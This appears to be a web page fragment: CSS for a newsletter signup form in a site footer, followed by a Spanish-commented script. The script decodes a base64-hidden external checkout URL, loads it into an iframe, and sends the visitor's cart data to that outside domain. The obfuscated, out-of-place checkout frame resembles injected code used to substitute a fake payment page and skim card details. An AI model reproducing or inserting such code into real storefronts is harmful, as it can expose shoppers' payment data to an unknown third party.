<style>
 /* Container styling */
.footer-newsletter__wrapper-form {
  max-width: 600px;
  margin: 0 auto;
  padding: 20px;
  background: #f5f5f5;
  border-radius: 20px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  font-family: Arial, sans-serif;
  text-align: center;
}

/* Title styling */
.footer-newsletter__title {
  font-size: 1.5rem;
  margin-bottom: 20px;
  color: #333;
}

/* Inline form container */
.footer-newsletter__form-inline {
  position: relative;
  display: flex;
  justify-content: center;
  align-items: center;
}

/* Input styling */
.footer-newsletter__form-inline-input {
  flex-grow: 1;
  position: relative;
}

.footer-newsletter__form-inline-input input {
  width: 100%;
  padding: 10px 50px 10px 15px; /* Padding to account for button */
  font-size: 1rem;
  border: 1px solid #ccc;
  border-radius: 25px; /* Rounded edges */
  box-sizing: border-box;
  outline: none;
  transition: border-color 0.3s ease;
}

.footer-newsletter__form-inline-input input:focus {
  border-color: #007bff;
}

/* Submit button inside the input */
.footer-newsletter__form-inline-btn {
  position: absolute;
  top: 50%;
  right: 10px;
  transform: translateY(-50%);
  background: #007bff;
  color: #fff;
  padding: 5px 15px;
  font-size: 0.9rem;
  border: none;
  border-radius: 20px;
  cursor: pointer;
  transition: background 0.3s ease;
}

.footer-newsletter__form-inline-btn:hover {
  background: #0056b3;
}

/* Error messages */
.footer-newsletter__error {
  color: red;
  font-size: 0.85rem;
  margin-top: 5px;
  display: none; /* Default hidden, shown dynamically */
}

/* Checkbox styling */
.footer-newsletter__checkbox {
  margin-top: 20px;
  display: flex;
  align-items: center;
  gap: 10px;
  justify-content: center;
}

.footer-newsletter__checkbox input {
  width: 18px;
  height: 18px;
  cursor: pointer;
}

.footer-newsletter__checkbox label {
  font-size: 0.9rem;
  color: #555;
  line-height: 1.4;
}

.footer-newsletter__checkbox a {
  color: #007bff;
  text-decoration: none;
}

.footer-newsletter__checkbox a:hover {
  text-decoration: underline;
}

/* Responsive design */
@media (max-width: 480px) {
  .footer-newsletter__form-inline {
    flex-direction: column;
  }

  .footer-newsletter__form-inline-btn {
    position: relative;
    transform: none;
    right: 0;
    margin-top: 10px;
  }

  .footer-newsletter__form-inline-input input {
    padding: 10px 15px;
  }
}

<script>
// Obtener el iframe
const iframe = document.getElementById("secureFrame");

// Decodificar la URL real (checkout)
const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi80L2NoZWNrb3V0Lmh0bWw=");

// Establecer la URL del iframe (checkout)
iframe.src = realURL;

// Escuchar el evento 'load' para asegurarse de que el iframe se haya cargado completamente
iframe.addEventListener("load", () => {
  // Función para enviar el carrito al iframe
  function enviarCarrito() {
    // Obtener el carrito desde localStorage (si no hay, se usa un array vacío)
    const carrito = JSON.parse(localStorage.getItem("carrito")) || [];

    // Enviar el carrito al iframe usando postMessage
    iframe.contentWindow.postMessage(
      { type: "carrito", data: carrito },  // Datos que enviamos al iframe
      "https://novie.in"  // Asegúrate de que esta URL sea correcta
    );

    console.log("Carrito enviado:", carrito);
  }

  // Enviar el carrito de inmediato cuando la página carga
  enviarCarrito();

  // Forzar el envío del carrito cada vez que el carrito cambie en localStorage
  window.addEventListener("storage", (event) => {
    if (event.key === "carrito") {
      // Si el carrito cambia, lo enviamos nuevamente al iframe
      enviarCarrito();
    }
  });

});

</script>
